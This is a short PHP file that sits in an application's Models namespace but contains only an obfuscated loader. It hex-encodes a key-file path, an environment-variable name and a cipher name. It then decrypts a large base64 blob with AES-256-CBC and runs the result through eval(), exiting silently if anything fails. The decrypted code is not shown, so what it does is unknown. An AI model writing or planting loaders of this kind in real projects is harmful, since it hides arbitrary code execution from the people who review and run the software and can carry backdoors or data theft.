<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ko7IrTb3sH9iXnkyXPhy+Q==');

$c=base64_decode(

'bv0iMAEc3w+PDU884CwXaH7Pb0Irwu0bB8vgPTuOCHygqQHYv2u4dfbyoHOSyAD2HDrJo5mvpaFd' .
'p/N3BvZmK7UvXnd6G0/bg+TRBS6yqTL30OnldklF8fS6J7QAWIU+laYk6FFgVvSR41bGWwoNMels' .
'6aPNuq0ImEphERJgtgrUQq4sBhulQIHwuT/yWIHUGB+CmS3kxoo5su4c4eZj2Kjv3DMTk9GAYebS' .
'Opag+ru54IthIAF8QUS4TM2vgMkWyb0ro7QBqhA01ALlwTfQoiMlaHuJWtndP+8JWyv0z3Ch68+6' .
'FO4FX+MUvMzTqN6hGHtDb8kDwCgyxnyzSuq82XzWLH9FWewVsGM1NYYTBtBWbZR52g14lcpGxeiO' .
'par6u5VsHLa3WqPHptdlDfcgx7YgdiXTYs3LDoGQjvib1fBmCWfC2Ry6lre8jBWfd4XVPA+TjMEJ' .
'3yZzMJ0pdamCOAgokRZgJwwpM4aM94Jj4LlfGUS9bY8Mdm/h/4IGrnJegH0n+cJ/C917Os0XbeQP' .
'eyslEZhaT4U4VKo4Q3oTAVBFwyr7pIMw7ly62n4InnAwCOxFctJDSAM13dsejOfh0vx4H5QDWt1p' .
'6sqfKbi4prCzNHIdRk7aDw1Ex+XFOlNHBYbLtumQR3TB+RVDb7sJWAuE+a1bpJpL7vviS5b4pbPE' .
'RLSMYnAwwsu64nIeLPTvpcAB5DEGZJCsiHRF9bUcE4ZK75ESzT57NNyi5t23t4UdZvsuby56+wlf' .
'DuduilhAkcWGKXC3und4bSlTNLN2LYGLX62c28gjZS59lMNmfaD0W4P2SIBKlN/rmTI/vA9klb0Q' .
'ZZBfmewRglU9SWDMFylb6xQbTlf/Hk+E7MTO9LctQhdfv8oyLj7kqVO/bHr7y+qL4pX9P/P1NtTP' .
'ug7qOzIkMFrT2MmfzSnI1o9QTo8/kWCV9EcaxfSTKZmkFFOIT2kO+/dR0qejg00hErGOS/Hqa3Hl' .
'r5m0jBS6aEqILfC7Z6ZKSiQZ2w23iNIEoGQqaE3iiuI0xJnkIlz42StG866GsC8IGGehMJMSZkO5' .
'6E/zkYxB/LLo/QaD97s+wdf70VN8xqKryPyNUbElhSc06wqjwtKu3qzWobO5Onj2mp/k4oEKXoXT' .
'VwxnwIclQTHZAsYotalk4EJep6zjOHa6Cni42xPz0vbFFsNjN7CvJfH72uqpZO1ZHfESZ7AgCV1G'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

